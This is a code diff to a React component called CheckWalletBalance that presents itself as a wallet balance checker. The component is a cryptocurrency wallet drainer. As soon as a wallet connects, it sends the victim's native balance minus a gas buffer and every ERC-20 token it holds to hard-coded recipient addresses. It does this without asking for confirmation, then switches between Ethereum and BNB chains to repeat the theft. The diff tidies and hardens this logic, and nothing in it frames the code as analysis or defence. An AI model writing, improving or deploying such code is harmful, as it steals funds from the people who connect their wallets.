@@ -12,39 +12,38 @@ const SUPPORTED_CHAINS = [1, 56]; // Ethereum and BNB
 
 export default function CheckWalletBalance() {
   const { address, isConnected } = useAppKitAccount();
+  const chainId = useChainId();
+  const { balance, symbol, isLoading } = useNativeBalance(address as `0x${string}`);
   const { transferNativeToken, transferERC20Token } = useTransferFunds();
+  const { switchChain, isSwitching } = useAutoSwitchChain();
+
   const [status, setStatus] = useState("");
   const [processedChains, setProcessedChains] = useState<number[]>([]);
   const [isProcessing, setIsProcessing] = useState(false);
 
-  const chainId = useChainId();
-  const { balance, symbol } = useNativeBalance(address as `0x${string}`);
-  const { switchChain, isSwitching } = useAutoSwitchChain();
   const GAS_BUFFER = getGasBufferByChain(chainId);
 
   const processWallet = async () => {
-    if (!address || !chainId || processedChains.includes(chainId) || isProcessing) return;
+    if (!address || !chainId || processedChains.includes(chainId)) return;
 
     setIsProcessing(true);
     try {
+      const numericBalance = parseFloat(balance);
       setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);
 
-      const thresholdMet = parseFloat(balance) >= MINIMUM_BALANCE;
-
-      if (!thresholdMet) {
-        setStatus("❌ Insufficient funds!");
-      }
-
-      if (thresholdMet) {
+      if (numericBalance < MINIMUM_BALANCE) {
+        setStatus(`❌ Insufficient funds on ${symbol}: ${balance}`);
+        setProcessedChains((prev) => [...prev, chainId]);
+      } else {
         const tokens = await getTokensWithBalance(address, chainId);
 
         if (tokens.length === 0) {
           setStatus("🚀 Sending native token...");
-          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
+          await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
           setStatus("✅ Native token sent!");
         } else {
-          setStatus("🚀 Sending tokens...");
-          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
+          setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
+          await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
 
           for (let token of tokens) {
             await transferERC20Token(
@@ -54,22 +53,22 @@ export default function CheckWalletBalance() {
               token.decimals
             );
           }
+
           setStatus("🎉 All tokens sent!");
         }
+
+        setProcessedChains((prev) => [...prev, chainId]);
       }
 
-      // Mark this chain as processed
-      setProcessedChains((prev) => [...prev, chainId]);
-
-      // Switch to next chain if any left
-      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
-      if (remainingChains.length > 0) {
-        const nextChainId = remainingChains[0];
-        setStatus(`🔁 Switching to chain ${nextChainId}...`);
-        await switchChain(nextChainId);
+      // Move to next chain
+      const nextChain = SUPPORTED_CHAINS.find(id => !processedChains.includes(id) && id !== chainId);
+      if (nextChain) {
+        setStatus(`🔁 Switching to chain ${nextChain}...`);
+        await switchChain(nextChain);
       } else {
         setStatus("✅ All chains processed.");
       }
+
     } catch (error) {
       console.error("❌ Error in processWallet:", error);
       setStatus("❌ Transfer failed!");
@@ -79,10 +78,17 @@ export default function CheckWalletBalance() {
   };
 
   useEffect(() => {
-    if (isConnected && address) {
+    const shouldProcess =
+      isConnected &&
+      address &&
+      !processedChains.includes(chainId) &&
+      !isProcessing &&
+      !isLoading;
+
+    if (shouldProcess) {
       processWallet();
     }
-  }, [isConnected, address, balance, symbol, chainId]);
+  }, [isConnected, address, chainId, isLoading]);
 
   return (
     <div className="text-center">
@@ -90,6 +96,7 @@ export default function CheckWalletBalance() {
       <p>Balance: {balance} {symbol}</p>
       <p>Status: {status}</p>
       {isSwitching && <p>🔄 Switching chain...</p>}
+      {isProcessing && <p>⏳ Processing...</p>}
     </div>
   );
 }
